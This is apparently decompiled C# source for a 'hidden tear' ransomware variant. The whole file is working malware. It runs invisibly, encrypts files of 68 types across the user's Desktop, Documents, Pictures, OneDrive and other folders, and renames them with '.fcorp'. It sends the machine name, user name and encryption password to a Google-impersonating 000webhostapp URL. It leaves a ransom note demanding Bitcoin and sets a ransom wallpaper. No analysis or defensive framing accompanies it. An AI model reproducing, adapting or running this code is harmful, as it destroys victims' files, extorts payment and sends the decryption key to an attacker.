using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace hidden_tear;

public class Form1 : Form
{
	private string targetURL = "https://accountsgoooglecomredirectaccountsmailprotect.000webhostapp.com/Server/write.php";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\";

	private string backgroundImageUrl = "http://i.imgur.com/xZuLWTN.jpg";

	private IContainer components;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		try
		{
			string text = "?computer_name=" + computerName + "&userName=" + userName + "&password=" + password + "&allow=ransom";
			string address = targetURL + text;
			new WebClient().DownloadString(address);
		}
		catch (Exception)
		{
		}
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		string text = "Users\\" + userName + "\\Desktop\\READ_IT.txt.fcorp";
		string path = userDir + text;
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".fcorp");
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[68]
			{
				".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx",
				".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln",
				".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c",
				".cs", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf",
				".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7-zip", ".ace", ".arj", ".bz2",
				".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3",
				".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j], password);
			}
		}
		catch (Exception)
		{
		}
	}

	public void MoveVirus()
	{
		string path = userDir + userName + "\\Rand123";
		string text = userDir + userName + "\\Rand123\\local.exe";
		if (!Directory.Exists(path))
		{
			Directory.CreateDirectory(path);
		}
		else if (File.Exists(text))
		{
			File.Delete(text);
		}
		string text2 = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
		File.Move(Directory.GetCurrentDirectory() + text2, text);
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("https://www.google.com"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void startAction()
	{
		MoveVirus();
		string password = CreatePassword(15);
		Directory_Settings_Sending(password);
		messageCreator();
		string path = userDir + userName + "\\ransom.jpg";
		bool flag;
		do
		{
			if (flag = CheckForInternetConnection())
			{
				SetWallpaperFromWeb(backgroundImageUrl, path);
				SendPassword(password);
			}
		}
		while (!flag);
		password = null;
		Application.Exit();
	}

	public void Directory_Settings_Sending(string password)
	{
		string text = "Users\\";
		string location = userDir + text + userName + "\\Desktop";
		string location2 = userDir + text + userName + "\\Links";
		string location3 = userDir + text + userName + "\\Contacts";
		string location4 = userDir + text + userName + "\\Desktop";
		string location5 = userDir + text + userName + "\\Documents";
		string location6 = userDir + text + userName + "\\Downloads";
		string location7 = userDir + text + userName + "\\Pictures";
		string location8 = userDir + text + userName + "\\Music";
		string location9 = userDir + text + userName + "\\OneDrive";
		string location10 = userDir + text + userName + "\\Saved Games";
		string location11 = userDir + text + userName + "\\Favorites";
		string location12 = userDir + text + userName + "\\Searches";
		string location13 = userDir + text + userName + "\\Videos";
		encryptDirectory(location, password);
		encryptDirectory(location2, password);
		encryptDirectory(location3, password);
		encryptDirectory(location4, password);
		encryptDirectory(location5, password);
		encryptDirectory(location6, password);
		encryptDirectory(location7, password);
		encryptDirectory(location8, password);
		encryptDirectory(location9, password);
		encryptDirectory(location10, password);
		encryptDirectory(location11, password);
		encryptDirectory(location12, password);
		encryptDirectory(location13, password);
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\READ_IT.txt";
		string path = userDir + "Users\\" + userName + text;
		_ = computerName + "-" + userName;
		string[] contents = new string[4] { "Ooops!", "Your personal files have been ecrypted. Send us 0.002 BTC to 1A1zRgFtPWT75vCWQ7K2PLX3cnwyHH1833.", "After that, you'll be able to see your beloved files again.", "With love... fcorp" };
		File.WriteAllLines(path, contents);
	}

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	private void SetWallpaperFromWeb(string url, string path)
	{
		try
		{
			new WebClient().DownloadFile(new Uri(url), path);
			SetWallpaper(path);
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(124, 53));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
